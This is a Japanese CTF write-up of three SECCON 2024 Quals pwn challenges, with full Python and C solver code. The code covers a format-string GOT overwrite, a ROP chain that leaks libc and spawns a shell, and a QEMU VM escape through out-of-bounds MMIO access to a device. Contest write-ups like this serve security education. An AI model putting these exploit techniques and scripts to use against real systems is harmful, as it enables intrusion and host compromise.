# SECCON 2024 Quals Writeup

- Paragraph
- Make ROP Great Again
- BabyQEMU

の3問を解きました。

## [pwn] Paragraph
自明FSBがある。no-pieなので、printf@gotを改ざんできる。今回はscanf@pltへ改ざんする。
printfが死んでもputsがいるので遠慮はいらない。

改ざんすると

```c
scanf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", name);
```

が呼ばれることになるので、無制限なStack BoFが手に入る。一回目は`puts(puts)`でリーク、二回目に入ってlibc ROPすればシェル。

```python
#!/bin/python3

from ptrlib import *
import time
import code
import struct

is_remote = True

libc = ELF("./libc.so.6") # we got libc from Dockerfile

elf = ELF("./chall_patched") # i recommend to use pwninit
symbols = elf.symbols()

# sock = Process("./chall_patched")
# sock = Process("./chall")
# input("Attach gdb")
sock = Socket("paragraph.seccon.games", 5000)

sock._debug = True

input("attach gdb")

# 0x401060 is plt of scanf
sock.sendlineafter(b'asked.\n', (f'%{0x401060}c%8$lnXX'.encode().ljust(16, b'\x01') + p64(elf.got('printf')))[:23])
# now printf@got is 0x401060(scanf@plt)

sock.recvuntil(b'XX') # XX is sentinel
sock.recv(6) # skip garbage

# we can use following gadget
# `scanf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", name);`

payload = flat([
    0xdeadbeef,  # fill the buffer
    0xdeadbeef, 
    0xdeadbeef, 
    0xdeadbeef, 
    0xdeadbeef, 
    next(elf.gadget("pop rdi; ret")),
    elf.got("puts"),
    0x401030, # puts@plt
    # puts(puts) leads to leak libc address!
    symbols[b"main"] # return to main (REENTER address is HERE!!!)
], map=p64)
# payload is ROP chain

assert is_scanf_safe(payload)

# we must satisfy scanf format string!!
sock.sendline(b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " + payload + b" warmly.I\n")

puts = u64(sock.recv(6).ljust(8, b'\x00'))
print(f"puts: {hex(puts)}") # puts address written on puts@got

libc_base = puts - libc.symbols()[b'puts']
libc.base = libc_base

# reentered to main (ref: line:44)

# 0x404038 is unused buffer
sock.sendlineafter(b'asked.\n', b'%7$d'.ljust(8, b'\x00') + p64(0x404038)) # skip the first scanf
sock.sendline(b'1') # and write 1 to the buffer

# let's craft ROP chain
payload = flat([
    0xdeadbeef,  # fill the buffer
    0xdeadbeef, 
    0xdeadbeef, 
    0xdeadbeef, 
    0xdeadbeef, 
    next(elf.gadget("ret")),
    next(elf.gadget("pop rdi; ret")),
    next(libc.search(b"/bin/sh\x00")),
    libc.symbols()[b'system']
], map=p64)

sock.sendline(b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted " + payload + b" warmly.I\n")

sock.sh()

code.interact(local=locals())
```

## [pwn] Make ROP Great Again

自明なStack BoFがあるが、ROPガジェットが終わっているためリークができない。FULL Relroなのでinitを使ってputs(stdout)もできず、リークを頑張るという問題。

バイナリ中にリークに使えそうな場所を探すと、

```
4010e7:       bf 10 40 40 00          mov    edi,0x404010
4010ec:       ff e0                   jmp    rax
4010ee:       66 90                   xchg   ax,ax
4010f0:       c3                      ret
```

がある(0x404010はstdout@got)。raxをputsにするというのが当面の方針となる。

さて、バイナリ中でraxを変更できるガジェットはいくつかあるが、使ったのは次のもの

```
0x401157: add eax, 0x00002ECB ; add  [rbp-0x3D], ebx ; nop ; ret ;
```

しかし、raxを正確にputsにしたいため、このガジェットでは0x2ecbの倍数しか設定できず不十分。そこでputsの返り値を使う。putsは表示した文字数分raxに入れて返すので、あまりの分を出力し、残りをガジェットで合わせれば良い。

```
puts@plt==0x401060
0x401060 / 0x2ecb = 0x15e
0x401060 % 0x2ecb = 0x16d6
```

もちろん、0x16d6文字ちょうどの文字列が存在しているわけはないので、自分で作る必要がある。幸い、getsは書き込みが正常に行われるとそこへのポインタを返すので、次のようなROPペイロードを送ると、raxに0x401060を設定できる。

```
gets(後で0x16d6分入力する)
puts
# rax == 0x16d6
0x401157 # add eax, 0x00002ECB ; add  [rbp-0x3D], ebx ; nop ; ret ;
0x401157
...
0x401157 (0x15e回入れる)
```

しかしこの方法にも問題があり、書き込む先のバッファがrdiで指定されるため、自由に設定できないという点である（設定できるならそもそもこんな回りくどいことはしない）。

何かしらの関数からretしたとき、$rdi$がwritableな領域にあるかどうかチェックを行うと、mainから帰るとき、

```
*RDI  0x7ffff7fb0720 (_IO_stdfile_0_lock) ◂— 0
```

となっており、これはlibcのrwな領域であった。つまり、先程のROPペイロードをmainから帰るときに行えば良い。

が、更にこの方法にも問題がある。領域はstdinのlockを指し示しているせいで、書き込んでしまうと次回のlockで死んでしまい、書き込むことができなくなるという点である。そこで、rdi全体を書き換えることはできなくても、下位バイトだけでもずらせないかとROPガジェットを探すと、ediやdi,dilレジスタにも視野を広げる必要があるが次のガジェットが見つかった。

```
pwndbg> x/5i 0x4010e9
   0x4010e9 <deregister_tm_clones+25>:  rex
   0x4010ea <deregister_tm_clones+26>:  add    dil,dil
   0x4010ed <deregister_tm_clones+29>:  loopne 0x401155 <__do_global_dtors_aux+21>
   0x4010ef <deregister_tm_clones+31>:  nop
   0x4010f0 <deregister_tm_clones+32>:  ret
pwndbg> x/5i 0x401155
   0x401155 <__do_global_dtors_aux+21>: inc    esi
   0x401157 <__do_global_dtors_aux+23>: add    eax,0x2ecb
   0x40115c <__do_global_dtors_aux+28>: add    DWORD PTR [rbp-0x3d],ebx
   0x40115f <__do_global_dtors_aux+31>: nop
   0x401160 <__do_global_dtors_aux+32>: ret
```

このガジェットを2回実行すると、

```
pwndbg> x/10gx 0x7ffff7fb0720
0x7ffff7fb0720 <_IO_stdfile_0_lock>:    0x0000000000000000      0x0000000000000000
0x7ffff7fb0730 <__pthread_force_elision>:       0x0000000000000000      0x0000000000000000
0x7ffff7fb0740 <__attr_list_lock>:      0x0000000000000000      0x0000000000000000
0x7ffff7fb0750 <init_sigcancel>:        0x0000000000000000      0x0000000000000000
0x7ffff7fb0760 <__nptl_threads_events>: 0x0000000000000000      0x0000000000000000
pwndbg> x/10gx 0x7ffff7fb0740
0x7ffff7fb0740 <__attr_list_lock>:      0x0000000000000000      0x0000000000000000
0x7ffff7fb0750 <init_sigcancel>:        0x0000000000000000      0x0000000000000000
0x7ffff7fb0760 <__nptl_threads_events>: 0x0000000000000000      0x0000000000000000
0x7ffff7fb0770: 0x0000000000000000      0x0000000000000000
0x7ffff7fb0780 <__pthread_keys>:        0x0000000000000000      0x0000000000000000
pwndbg> x/10gx 0x7ffff7fb0780
0x7ffff7fb0780 <__pthread_keys>:        0x0000000000000000      0x0000000000000000
0x7ffff7fb0790 <__pthread_keys+16>:     0x0000000000000000      0x0000000000000000
0x7ffff7fb07a0 <__pthread_keys+32>:     0x0000000000000000      0x0000000000000000
0x7ffff7fb07b0 <__pthread_keys+48>:     0x0000000000000000      0x0000000000000000
0x7ffff7fb07c0 <__pthread_keys+64>:     0x0000000000000000      0x0000000000000000
```

のように、lockとは関係ない場所にrdiが移動する(\_\_pthread_keys)。ここは書き込んでも大丈夫なので（大丈夫だったので）、この領域に移しgetsを実行し、更にputsを使えばリークができる。あとはもう一度書き込むときにlibcでsystem("/bin/sh")を呼べば良い。

exploitを書く際は、全体的にrbpの扱いをうまくやらないと、スタックの不足などで死ぬため、bssをうまく活用しなければならない。

solver
```python
#!/bin/python3

from ptrlib import *
import time
import code
import struct
import subprocess

elf = ELF("./chall_patched")
symbols = elf.symbols()

# sock = Process("./chall_patched")
sock = Socket("mrga.seccon.games", 7428)
sock._debug = True

sock.recvuntil(b"work:\n")
command = sock.recvline()

token = subprocess.run(["bash", "-c", command.decode()], capture_output=True).stdout.decode()
sock.send(token)

libc = ELF("./libc.so.6")

input("Attach gdb")

moved_stack = 0x404000 + 0x400
big_stack = 0x405000 - 0x80

# let's make rax to 0x401060(puts@plt)
# 0x401157: add eax, 0x00002ECB ; add  [rbp-0x3D], ebx ; nop ; ret ; (1 found)

# 0x401060 / 0x2ecb = 0x15e
# 0x401060 % 0x2ecb = 0x16d6

gets_rbp_0x10 = symbols[b'main'] + 17

payload = flat([
    0, # fill the buffer
    0, 
    moved_stack, # rbp
    next(elf.gadget("ret")), # adjust stack
    gets_rbp_0x10
], map=p64)

sock.sendlineafter(b">", payload)

# 0x4010e9: add dil, dil ; loopne 0x00401155 ; nop ; ret ; (1 found)
change_rdi = 0x4010e9

payload = flat([
    0, # fill the buffer
    0,
    moved_stack, # rbp
    elf.plt(b'gets'), # gets@plt (No.1)
    change_rdi, # add dil, dil;
    change_rdi, # add dil, dil; # avoid lock
    # now, rdi == __pthread_keys(?)
    elf.plt(b'gets'), # gets@plt (No.2). write 0x16d6 to __pthread_keys
    change_rdi, # add dil, dil;
    change_rdi, # add dil, dil; # avoid lock
    elf.plt(b'puts'), # puts(__pthread_keys)
    # now, rax == 0x16d6
] + [
    0x401157, # add eax, 0x00002ECB ; add  [rbp-0x3D], ebx ; nop ; ret ;
] * 0x15e + [
    # now, rax == 0x401060(puts@plt)

    # 4010e7:       bf 10 40 40 00          mov    edi,0x404010
    # 4010ec:       ff e0                   jmp    rax
    # 4010ee:       66 90                   xchg   ax,ax
    # 4010f0:       c3                      ret

    0x4010e7, # puts(stdout)

    next(elf.gadget("pop rbp; ret")), # system needs more stack
    big_stack, # rbp

    gets_rbp_0x10 # go to next!
], map=p64)

assert is_gets_safe(payload)

sock.sendline(payload)

sock.sendline(b'') # No.1 (avoid writing to lock)

sock.sendline(b'P' * (0x16d6 - 1 - 5) + b'XXXXX') # No.2 ( -1 is newline, XXXXX is sentinel)
sock.recvuntil(b'XXXXX\n')

stdout = u64(sock.recv(6).ljust(8, b'\x00'))
libc_base = stdout - libc.symbols()[b'_IO_2_1_stdout_']

libc.base = libc_base

payload = flat([
    0, # fill the buffer
    0,
    0, # rbp
    next(libc.gadget(b"pop rdi; ret")),
    next(libc.search(b"/bin/sh\x00")),
    next(libc.gadget(b"ret")),
    libc.symbols()[b'system'],
], map=p64)

assert is_gets_safe(payload)

sock.sendline(payload)

sock.sendline("echo YOU GOT SHELL")
sock.sh()

code.interact(local=locals())
```

## [pwn] BabyQEMU

ホスト側に自明なBoFを引き起こすデバイスが追加されたQEMUに対して攻撃を行い、VM Escapeを行う。
デバイスはpciに生えているので、ユーザランドからmmapしてアクセスすれば使うことができる。次のようなライブラリを作った。

```c
volatile uint32_t *mmio_base;

void set_offset(uint64_t offset) {
  mmio_base[MMIO_SET_OFFSET_LO / 4] = (uint32_t)(offset & 0xFFFFFFFF);
  mmio_base[MMIO_SET_OFFSET_HI / 4] = (uint32_t)((offset >> 32) & 0xFFFFFFFF);
}

void write_u32(uint64_t offset, uint32_t u32) {
  set_offset(offset);
  mmio_base[MMIO_SET_DATA / 4] = u32;
}

void write_u64(uint64_t offset, uint64_t u64) {
  write_u32(offset, u64 & 0xffffffff);
  write_u32(offset + 4, (u64 >> 32) & 0xffffffff);
}

void write_at_u64(uint64_t offset, uint64_t u64) { write_u64(offset * 8, u64); }
uint32_t read_u32(uint64_t offset) {
  set_offset(offset);
  uint32_t ret = mmio_base[MMIO_GET_DATA / 4];

  return ret;
}

uint64_t read_u64(uint64_t offset) {
  uint32_t lo = read_u32(offset);
  uint32_t hi = read_u32(offset + 4);

  return (((uint64_t)hi) << 32) | ((uint64_t)lo);
}

uint64_t read_at_u64(uint64_t offset) {
  return read_u64(offset * 8);
}
```

```c
  const char *device_path =
      "/sys/bus/pci/devices/0000:00:04.0/resource0";
  int fd = open(device_path, O_RDWR | O_SYNC);

  mmio_base =
      mmap(NULL, MMIO_REGION_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
```

この辺はChatGPTが書いてくれたので楽。

さて、このオフセット、負の値も設定できるため、前の領域を書き換えることができる。その時のヒープを見てみると、

```
pwndbg> tel &ms->buffer -r 30
00:0000│  0x55555b3ef8a0 ◂— 0
01:0008│  0x55555b3ef8a8 ◂— 0
02:0010│  0x55555b3ef8b0 —▸ 0x55555b3eed90 —▸ 0x55555a489240 —▸ 0x55555a2e2140 —▸ 0x55555a2b8fc0 ◂— ...
03:0018│  0x55555b3ef8b8 —▸ 0x55555b3eed90 —▸ 0x55555a489240 —▸ 0x55555a2e2140 —▸ 0x55555a2b8fc0 ◂— ...
04:0020│  0x55555b3ef8c0 —▸ 0x55555627c460 (pci_babydev_mmio_ops) —▸ 0x55555590e430 (pci_babydev_mmio_read) ◂— mov rax, 0xffffffffffffffff
05:0028│  0x55555b3ef8c8 —▸ 0x55555b3eed90 —▸ 0x55555a489240 —▸ 0x55555a2e2140 —▸ 0x55555a2b8fc0 ◂— ...
06:0030│  0x55555b3ef8d0 —▸ 0x55555a5a2cd0 —▸ 0x55555a3df6b0 —▸ 0x55555a336400 —▸ 0x55555a336580 ◂— ...
07:0038│  0x55555b3ef8d8 ◂— 0
08:0040│  0x55555b3ef8e0 ◂— 0x10
09:0048│  0x55555b3ef8e8 ◂— 0
0a:0050│  0x55555b3ef8f0 ◂— 0xfebd2000
0b:0058│  0x55555b3ef8f8 —▸ 0x555555c83ef0 (memory_region_destructor_none) ◂— ret
0c:0060│  0x55555b3ef900 ◂— 0
0d:0068│  0x55555b3ef908 ◂— 0x10001
0e:0070│  0x55555b3ef910 ◂— 0
0f:0078│  0x55555b3ef918 ◂— 0
10:0080│  0x55555b3ef920 ◂— 1
11:0088│  0x55555b3ef928 ◂— 0
12:0090│  0x55555b3ef930 —▸ 0x55555b3ef928 ◂— 0
13:0098│  0x55555b3ef938 —▸ 0x55555b2a3aa0 —▸ 0x55555a3df6b0 —▸ 0x55555a336400 —▸ 0x55555a336580 ◂— ...
14:00a0│  0x55555b3ef940 —▸ 0x55555a5a2d88 —▸ 0x55555b3ef870 —▸ 0x55555a3df6b0 —▸ 0x55555a336400 ◂— ...
15:00a8│  0x55555b3ef948 ◂— 0
16:00b0│  0x55555b3ef950 —▸ 0x55555b3ef948 ◂— 0
17:00b8│  0x55555b3ef958 —▸ 0x55555b3f1b10 ◂— 'baby-mmio'
18:00c0│  0x55555b3ef960 ◂— 0
... ↓     3 skipped
1c:00e0│  0x55555b3ef980 —▸ 0x55555b3f10d0 ◂— 0
1d:00e8│  0x55555b3ef988 ◂— 0
```

と、`0x55555b3ef8c0` にbabydevのread,writeへのポインタが乗っていそうなところがある。それ以外にも、ヒープ自身のアドレスもたくさん乗っており、適当なところからアドレスのリークができる。

これでRIPを取ることができるが、どこに飛ばすかが問題。
最初はstdoutやstdinが死んでいると思い、mprotect+shellcodeでフラグをヒープに乗せると思っていたのだが、普通に`system("/bin/sh")`を呼べば素直にシェルが落ちてくる。そこでlibc leakを行うことを考える。

そもそも、bufferはbaby.c内で次のようにアロケーションされている。

```
ms->reg_mmio = g_malloc(sizeof(struct PCIBabyDevReg));
```

`g_malloc`はglibの関数で、

```c
gpointer
g_malloc (gsize n_bytes)
{
  if (G_LIKELY (n_bytes))
    {
      gpointer mem;

      mem = malloc (n_bytes);
      TRACE (GLIB_MEM_ALLOC((void*) mem, (unsigned int) n_bytes, 0, 0));
      if (mem)
	return mem;

      g_error ("%s: failed to allocate %"G_GSIZE_FORMAT" bytes",
               G_STRLOC, n_bytes);
    }

  TRACE(GLIB_MEM_ALLOC((void*) NULL, (int) n_bytes, 0, 0));

  return NULL;
}
```

と、mallocが使われているため、遡っていけばどこかにunsorted_binに繋がれたmain_arenaへのポインタがあるはず。
探すと、あり、leakできる。

opsのwriteあたりをsystemにすると、

```
static void pci_babydev_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size) {
```

の`opaque`をコマンドとして実行することになる。この`opaque`もヒープに乗っているため、そこに b"/bin/sh\x00" を書き込めば勝ち。

ヒープがかなり決定的に決まるので解けた。
ちなみに、stdoutが死んでいても、qemuにはrwxな領域が存在するため、そこへの書き込みとジャンプでshellcode実行も達成できる（と思う）。

ゲストで実行するバイナリは次の通り。

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BABY_PCI_VENDOR_ID 0x4296
#define BABY_PCI_DEVICE_ID 0x1338

#define MMIO_SET_OFFSET_LO 0x00
#define MMIO_SET_OFFSET_HI 0x04
#define MMIO_SET_DATA 0x08
#define MMIO_GET_DATA 0x08

#define MMIO_REGION_SIZE 0x1000

volatile uint32_t *mmio_base;

void set_offset(uint64_t offset) {
  mmio_base[MMIO_SET_OFFSET_LO / 4] = (uint32_t)(offset & 0xFFFFFFFF);
  mmio_base[MMIO_SET_OFFSET_HI / 4] = (uint32_t)((offset >> 32) & 0xFFFFFFFF);
}

void write_u32(uint64_t offset, uint32_t u32) {
  set_offset(offset);
  mmio_base[MMIO_SET_DATA / 4] = u32;
}

void write_u64(uint64_t offset, uint64_t u64) {
  write_u32(offset, u64 & 0xffffffff);
  write_u32(offset + 4, (u64 >> 32) & 0xffffffff);
}

void write_at_u64(uint64_t offset, uint64_t u64) { write_u64(offset * 8, u64); }
uint32_t read_u32(uint64_t offset) {
  set_offset(offset);
  uint32_t ret = mmio_base[MMIO_GET_DATA / 4];

  return ret;
}

uint64_t read_u64(uint64_t offset) {
  uint32_t lo = read_u32(offset);
  uint32_t hi = read_u32(offset + 4);

  return (((uint64_t)hi) << 32) | ((uint64_t)lo);
}

uint64_t read_at_u64(uint64_t offset) { return read_u64(offset * 8); }

int main() {
  printf("start\n");

  const char *device_path = "/sys/bus/pci/devices/0000:00:04.0/resource0";
  int fd = open(device_path, O_RDWR | O_SYNC);
  if (fd < 0) {
    perror("Failed to open PCI device resource");
    return EXIT_FAILURE;
  }

  mmio_base =
      mmap(NULL, MMIO_REGION_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (mmio_base == MAP_FAILED) {
    perror("Failed to map MMIO region");
    close(fd);
    return EXIT_FAILURE;
  }

  printf("MMIO region mapped at %p\n", (void *)mmio_base);

  uint64_t heap_leak = read_at_u64(-7) + 8 * 8; // heap
  printf("[+] qemu host buffer at 0x%lx\n", heap_leak);

  uint64_t libc_leak = read_at_u64(-0x182) - 0x203b20; // libc(main_arena+96)
  printf("[+] qemu host libc at 0x%lx\n", libc_leak);

  write_at_u64(-383, 0x0068732f6e69622f); // /bin/sh
  printf("[+] wrote /bin/sh at 0x%lx\n", heap_leak);

  write_at_u64(1, libc_leak +
                      0x0000000000058740); // overwrite system to `write` ops
  printf("[+] overwrite babyops(write). host's system = 0x%lx\n",
         libc_leak + 0x0000000000058740);

  write_at_u64(-25, heap_leak); // overwrite ops pointer!

  mmio_base[0xdead] = 0xbeef; // fire!!

  // Clean up
  munmap((void *)mmio_base, MMIO_REGION_SIZE);
  close(fd);

  return EXIT_SUCCESS;
}
```

余談だが、バイナリを小さくしても転送に失敗してしまい手こずった。gzipが使えたの、圧縮したら行けた。

```python
from ptrlib import *
import time
import base64
import os
import subprocess

def run(cmd):
    sock.sendlineafter("# ", cmd)
    sock.recvline()

with open("./exploit/main.gz", "rb") as f:
    payload = bytes2str(base64.b64encode(f.read()))

#sock = Socket("HOST", PORT) # remote

# sock = Process("./run.sh")

# sock = Socket("localhost", 3824)
sock = Socket("babyqemu.seccon.games", 3824)
command = sock.recvline()
token = subprocess.run(["bash", "-c", command.decode()], capture_output=True).stdout.decode()
 
print(f"Token: {token}")
sock.sendlineafter(b"token", token)

sock.sendlineafter(b"login", b"root")

run('cd /tmp')

logger.info("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    run('echo "{}" >> b64exp'.format(payload[i:i + 512]))
run('base64 -d b64exp > main.gz')
run('rm b64exp')
run('gzip -d main.gz')
run('chmod +x main')
run('./main')

sock.sendline("echo YOU GOT SHELL")

sock.sh()
```


# 感想

たのしかった。
